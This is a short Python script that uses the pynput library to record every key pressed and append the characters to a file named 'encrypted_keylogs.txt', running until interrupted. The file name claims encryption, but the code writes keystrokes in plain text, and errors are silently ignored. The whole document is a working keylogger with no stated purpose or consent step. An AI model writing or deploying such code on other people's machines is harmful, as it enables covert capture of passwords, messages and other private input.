from pynput import keyboard
import os

keylogs_file = "encrypted_keylogs.txt"

def on_press(key):
    try:
        with open(keylogs_file, "a") as f:
            f.write(str(key.char))
    except Exception as e:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    listener.stop()